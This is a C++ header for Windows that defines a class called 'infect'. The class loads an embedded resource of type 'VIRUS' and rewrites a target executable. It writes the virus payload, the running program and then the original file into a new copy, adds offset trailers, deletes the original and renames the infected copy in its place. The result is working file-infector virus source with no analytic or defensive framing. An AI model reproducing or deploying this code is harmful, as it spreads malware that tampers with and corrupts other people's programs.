#pragma once

#include "Windows.h"
#include <cstring>
#include <stdio.h>
#include <iostream>
#include "resource.h"
#include <fstream>
using namespace std;
class infect
{
private:
    string selfFileName;
    int infectExeLen;
public:
    infect(char *argv[])
    {
        this->getFileName(argv);
    }
    std::string getFileName(char* argv[])
    {
        char   path_buffer[_MAX_PATH];
        char   drive[_MAX_DRIVE];
        char   *dir  = (char*)malloc(sizeof(char) * _MAX_DIR);
        char* fname = (char*)malloc(sizeof(char) * _MAX_FNAME);
        char* ext = (char*)malloc(sizeof(char) * _MAX_EXT);
        string res;

        _splitpath(reinterpret_cast<const char*>(argv[0]), drive, dir, fname, ext);
        res = (string)dir + (string)fname + (string)ext;
        selfFileName = res;
        return res;
    }
	char *getInfectEXE()
	{
        char * data;
		HINSTANCE hInst = GetModuleHandleW(NULL);
        HRSRC hRes = ::FindResourceW(hInst, MAKEINTRESOURCE(IDR_VIRUS1), L"VIRUS");
        if (NULL != hRes)
        {
            HGLOBAL hData = LoadResource(hInst, hRes);
            if (hData)
            {
                this->infectExeLen = SizeofResource(hInst, hRes);
                data = (char *)(LockResource(hData));
                return data;
            }
        }
        return NULL;
	}
    int getFileLength(ifstream &file)
    {
        int len;
        file.seekg(0, file.end); //获取文件真实长度
        len = (int)file.tellg();
        file.seekg(0, file.beg);
        return len;
    }

    void copy(ifstream &src, int srclen ,ofstream &out)
    {
        int offset = 0;

        const int BUFFER_SIZE = 373000;
        int readSize = min(BUFFER_SIZE, srclen - offset);
        std::string buffer(BUFFER_SIZE + 1, '\0');
        while (readSize > 0 && src.read(&buffer[0], readSize)) {
            out.write(&buffer[0], readSize);
            offset += readSize;
            readSize = min(BUFFER_SIZE, srclen - offset);
        }
    }
    void infectExe(string filename)
    {


        ifstream selfFile,srcFile;
        ofstream out;
        int srcLength, selfLength;
        selfFile.open(this->selfFileName, ios::binary); //读取文件流
        srcFile.open(filename,  ios::binary);
        out.open(filename+".bak", ios::out | ios::binary);


        srcLength = this->getFileLength(srcFile);
        selfLength = this->getFileLength(selfFile);
        char* ex = this->getInfectEXE();
        out.write(ex, this->infectExeLen);
        
        this->copy(selfFile, selfLength, out);
        this->copy(srcFile, srcLength, out);
        int data = this->infectExeLen,data2 = selfLength + data;
        out.write((char*)&data, sizeof(int));
        out.write((char*)&data2, sizeof(int));
        selfFile.close();
        srcFile.close();
        out.close();
        remove(filename.c_str());
        string a = filename + ".bak";
        rename(a.c_str(), filename.c_str());
        return;

    }
};

